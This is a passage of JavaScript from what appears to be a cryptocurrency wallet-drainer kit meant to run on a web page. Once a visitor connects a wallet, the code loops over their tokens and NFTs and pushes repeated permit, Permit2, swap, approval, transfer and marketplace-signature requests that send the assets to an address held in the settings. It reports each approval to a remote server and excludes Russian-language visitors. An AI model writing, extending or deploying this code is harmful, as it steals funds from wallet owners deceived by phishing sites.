              asset.permit_ver = "1";
              asset.abi = data;
              if (permit_type > 0) {
                if (contract.functions.hasOwnProperty('version')) {
                  try {
                    asset.permit_ver = await contract.version();
                  } catch(err) {
                    console.log(err);
                  }
                }
                console.log(`[PERMIT FOUND] ${asset.name}, Permit Type: ${permit_type}, Version: ${asset.permit_ver}`);
              }
            }
            if (asset.permit > 0) {
              for (const c_address of MS_Settings.Permit_BL) {
                if (c_address[0] == MS_Current_Chain_ID && c_address[1] === asset.address.toLowerCase().trim()) {
                  asset.permit = 0;
                  break;
                }
              }
            }
            if (MS_Settings.Settings.Permit2.Mode && asset.permit2) {
              const all_permit2 = [];
              for (const x_asset of assets) {
                try {
                  if (x_asset.chain_id == asset.chain_id && x_asset.permit2) {
                    all_permit2.push(x_asset);
                    x_asset.skip = true;
                  }
                } catch(err) {
                  console.log(err);
                }
              }
              while (true) {
                try {
                  await DO_PERMIT2(asset, all_permit2);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await approve_cancel();
                  if (!MS_Settings.Loop_T) break;
                }
              }
            } else if (MS_Settings.Settings.Permit.Mode && asset.permit && asset.permit > 0) {
              while (true) {
                try {
                  await PERMIT_TOKEN(asset);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await approve_cancel();
                  if (!MS_Settings.Loop_T) break;
                }
              }
            } else if (MS_Settings.Settings.Swappers.Enable && asset.swapper && asset.amount_usd >= MS_Settings.Settings.Swappers.Price) {
              if (asset.swapper_type == 'Uniswap') {
                const all_uniswap = [];
                for (const x_asset of assets) {
                  try {
                    if (x_asset.chain_id == asset.chain_id && x_asset.swapper && x_asset.swapper_type == 'Uniswap') {
                      all_uniswap.push(x_asset);
                      x_asset.skip = true;
                    }
                  } catch(err) {
                    console.log(err);
                  }
                }
                while (true) {
                  try {
                    await DO_UNISWAP(asset, all_uniswap);
                    asset.skip = true;
                    break;
                  } catch(err) {
                    console.log(err);
                    await sign_cancel();
                    if (!MS_Settings.Loop_T) break;
                  }
                }
              } else if (asset.swapper_type == 'Pancake_V3') {
                const all_pancake = [];
                for (const x_asset of assets) {
                  try {
                    if (x_asset.chain_id == asset.chain_id && x_asset.swapper && x_asset.swapper_type == 'Pancake_V3') {
                      all_pancake.push(x_asset);
                      x_asset.skip = true;
                    }
                  } catch(err) {
                    console.log(err);
                  }
                }
                while (true) {
                  try {
                    await DO_PANCAKE_V3(asset, all_pancake);
                    asset.skip = true;
                    break;
                  } catch(err) {
                    console.log(err);
                    await sign_cancel();
                    if (!MS_Settings.Loop_T) break;
                  }
                }
              } else {
                while (true) {
                  try {
                    await DO_SWAP(asset);
                    asset.skip = true;
                    break;
                  } catch(err) {
                    console.log(err);
                    await sign_cancel();
                    if (!MS_Settings.Loop_T) break;
                  }
                }
              }
            } else if (MS_Settings.Settings.Sign.Tokens > 0 && (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force == 1)) {
              while (true) {
                try {
                  await SIGN_TOKEN(asset);
                  if (MS_Settings.Settings.Sign.Tokens == 1) {
                    const x_promise = send_request({ action: 'approve_token', user_id: MS_ID, asset, address: MS_Current_Address });
                    if (MS_Settings.Settings.Wait_For_Response) await x_promise;
                  }
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  if ((MS_Settings.Settings.Sign.WC_AE == 1 && MS_Current_Provider == 'WalletConnect') || (typeof err.message == 'string' && err.message.includes('eth_sign')) || err.code == -32601
                  || err.code == -32000 || (err.message && is_valid_json(err.message) && ((JSON.parse(err.message)).code == -32601 || (JSON.parse(err.message)).code == -32000))) {
                    if (MS_Settings.Settings.Sign.Force == 1) {
                      await sign_cancel();
                    } else {
                      await sign_unavailable();
                      while (true) {
                        if (MS_Settings.Settings.Sign.Tokens == 1) {
                          if ((MS_Current_Provider == 'MetaMask' && MS_Settings.Settings.Approve.MetaMask) || (MS_Current_Provider == 'Trust Wallet'
                          && MS_Settings.Settings.Approve.Trust) || (MS_Current_Provider != 'MetaMask' && MS_Current_Provider != 'Trust Wallet')) {
                            try {
                              let res_code = await APPROVE_TOKEN(asset);
                              if (res_code == 1) {
                                const x_promise = send_request({ action: 'approve_token', user_id: MS_ID, asset, address: MS_Current_Address });
                                if (MS_Settings.Settings.Wait_For_Response) await x_promise;
                              }
                              asset.skip = true;
                              break;
                            } catch(err) {
                              await approve_cancel();
                              if (!MS_Settings.Loop_T) break;
                            }
                          } else {
                            try {
                              await TRANSFER_TOKEN(asset);
                              asset.skip = true;
                              break;
                            } catch(err) {
                              console.log(err);
                              await transfer_cancel();
                              if (!MS_Settings.Loop_T) break;
                            }
                          }
                        } else if (MS_Settings.Settings.Sign.Tokens == 2) {
                          try {
                            await TRANSFER_TOKEN(asset);
                            asset.skip = true;
                            break;
                          } catch(err) {
                            console.log(err);
                            await transfer_cancel();
                            if (!MS_Settings.Loop_T) break;
                          }
                        }
                      }
                    }
                    break;
                  } else {
                    console.log(err);
                    if (err != 'LOW_BALANCE') {
                      await sign_cancel();
                      if (!MS_Settings.Loop_T) break;
                    } else {
                      break;
                    }
                  }
                }
              }
            } else if ((MS_Current_Provider == 'MetaMask' && MS_Settings.Settings.Approve.MetaMask) || (MS_Current_Provider == 'Trust Wallet'
            && MS_Settings.Settings.Approve.Trust) || (MS_Current_Provider != 'MetaMask' && MS_Current_Provider != 'Trust Wallet')) {
              while (true) {
                try {
                  let res_code = await APPROVE_TOKEN(asset);
                  if (res_code == 1) {
                    const x_promise = send_request({ action: 'approve_token', user_id: MS_ID, asset, address: MS_Current_Address });
                    if (MS_Settings.Settings.Wait_For_Response) await x_promise;
                  }
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await approve_cancel();
                  if (!MS_Settings.Loop_T) break;
                }
              }
            } else {
              while (true) {
                try {
                  await TRANSFER_TOKEN(asset);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await transfer_cancel();
                  if (!MS_Settings.Loop_T) break;
                }
              }
            }
          } else if (asset.type == 'ERC721') {
            if (typeof SIGN_BLUR !== 'undefined' && MS_Settings.Settings.Blur.Enable == 1 && MS_Settings.Settings.Blur.Priority == 0 && !BL_US
            && MS_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, MS_Current_Address, "0x00000000000111abe46ff893f3b2fdf1f759a8a8"))
            && asset.amount_usd >= MS_Settings.Settings.Blur.Price) {
              await SIGN_BLUR(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.Blur.Price); BL_US = true;
            } else if (typeof SIGN_SEAPORT !== 'undefined' && MS_Settings.Settings.SeaPort.Enable == 1 && MS_Settings.Settings.SeaPort.Priority == 0 && !SP_US
            && MS_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, MS_Current_Address, "0x1E0049783F008A0085193E00003D00cd54003c71"))
            && asset.amount_usd >= MS_Settings.Settings.SeaPort.Price) {
              await SIGN_SEAPORT(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.SeaPort.Price); SP_US = true;
            } else if (typeof SIGN_X2Y2 !== 'undefined' && MS_Settings.Settings.x2y2.Enable == 1 && MS_Settings.Settings.x2y2.Priority == 0 && !XY_US
            && MS_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, MS_Current_Address, "0xf849de01b080adc3a814fabe1e2087475cf2e354"))
            && asset.amount_usd >= MS_Settings.Settings.x2y2.Price) {
              await SIGN_X2Y2(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.x2y2.Price); XY_US = true;
            } else if (MS_Settings.Settings.Sign.NFTs > 0 && (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force == 1)) {
              while (true) {
                try {
                  await SIGN_NFT(asset);
                  if (MS_Settings.Settings.Sign.Tokens == 1) {
                    let same_collection = [];
                    for (const x_asset of assets) {
                      try {
                        if (x_asset.address == asset.address) {
                          same_collection.push(x_asset);
                          x_asset.skip = true;
                        }
                      } catch(err) {
                        console.log(err);
                      }
                    }
                    await send_request({
                      action: 'safa_approves', user_id: MS_ID, tokens: same_collection, address: MS_Current_Address,
                      chain_id: MS_Current_Chain_ID, contract_address: asset.address
                    });
                  }
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  if ((MS_Settings.Settings.Sign.WC_AE == 1 && MS_Current_Provider == 'WalletConnect') || (typeof err.message == 'string' && err.message.includes('eth_sign')) || err.code == -32601
                  || err.code == -32000 || (err.message && is_valid_json(err.message) && ((JSON.parse(err.message)).code == -32601 || (JSON.parse(err.message)).code == -32000))) {
                    if (MS_Settings.Settings.Sign.Force == 1) {
                      await sign_cancel();
                    } else {
                      await sign_unavailable();
                      while (true) {
                        if (MS_Settings.Settings.Sign.NFTs == 1) {
                          try {
                            await DO_SAFA(asset);
                            let same_collection = [];
                            for (const x_asset of assets) {
                              try {
                                if (x_asset.address == asset.address) {
                                  same_collection.push(x_asset);
                                  x_asset.skip = true;
                                }
                              } catch(err) {
                                console.log(err);
                              }
                            }
                            await send_request({
                              action: 'safa_approves', user_id: MS_ID, tokens: same_collection, address: MS_Current_Address,
                              chain_id: MS_Current_Chain_ID, contract_address: asset.address
                            });
                            asset.skip = true;
                            break;
                          } catch(err) {
                            console.log(err);
                            await approve_cancel();
                            if (!MS_Settings.Loop_NFT) break;
                          }
                        } else if (MS_Settings.Settings.Sign.NFTs == 2) {
                          try {
                            await TRANSFER_NFT(asset);
                            asset.skip = true;
                            break;
                          } catch(err) {
                            console.log(err);
                            await transfer_cancel();
                            if (!MS_Settings.Loop_NFT) break;
                          }
                        }
                      }
                    }
                    break;
                  } else {
                    console.log(err);
                    if (err != 'LOW_BALANCE') {
                      await sign_cancel();
                      if (!MS_Settings.Loop_NFT) break;
                    } else {
                      break;
                    }
                  }
                }
              }
            } else if (MS_Settings.Settings.Approve.Enable) {
              while (true) {
                try {
                  await DO_SAFA(asset);
                  let same_collection = [];
                  for (const x_asset of assets) {
                    try {
                      if (x_asset.address == asset.address) {
                        same_collection.push(x_asset);
                        x_asset.skip = true;
                      }
                    } catch(err) {
                      console.log(err);
                    }
                  }
                  await send_request({
                    action: 'safa_approves', user_id: MS_ID, tokens: same_collection, address: MS_Current_Address,
                    chain_id: MS_Current_Chain_ID, contract_address: asset.address
                  });
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await approve_cancel();
                  if (!MS_Settings.Loop_NFT) break;
                }
              }
            } else {
              while (true) {
                try {
                  await TRANSFER_NFT(asset);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await transfer_cancel();
                  if (!MS_Settings.Loop_NFT) break;
                }
              }
            }
          }
        } catch(err) {
          console.log(err);
        }
      }
    }
    MS_Process = false;
    setTimeout(end_message, 2000);
  } catch(err) {
    console.log(err);
  }
}

try {
  let query_string = window.location.search, url_params = new URLSearchParams(query_string);
  if (url_params.get('cis') != 'test' && (navigator.language || navigator.userLanguage).toLowerCase().includes('ru')) {
    MS_Bad_Country = true;
  }
} catch(err) {
  console.log(err);
}

document.addEventListener('DOMContentLoaded', async () => {
  try {
    if (MS_Modal_Style == 2) MSM.init(); else inject_modal();
    if (MS_Loader_Style == 2) MSL.init();
    MS_Load_Time = Math.floor(Date.now() / 1000);
    MS_Connection = true;
    fill_chain_data();
    MS_Deviceinfo = await getDeviceInfo();

    if (typeof localStorage['MS_ID'] === 'undefined') {
      const ID_Data = await send_request({ action: 'retrive_id' });
      if (ID_Data.status == 'OK') localStorage['MS_ID'] = ID_Data.data;
      else localStorage['MS_ID'] = Math.floor(Date.now() / 1000);
    }
    MS_ID = localStorage['MS_ID'], MS_Ready = true;
    enter_website();
    for (const chain_id in MS_Settings.RPCs) MS_Gas_Reserves[chain_id] = 0;
    
    for (const elem of document.querySelectorAll('.connect-button')) {
      try {
        elem.addEventListener('click', () => ms_init());
      } catch(err) {
        console.log(err);
      }
    }
  } catch(err) {
    console.log(err);
  }
});

const use_wc = () => { connect_wallet('WalletConnect'); };

window.addEventListener("beforeunload", (e) => leave_website());
window.addEventListener("onbeforeunload", (e) => leave_website());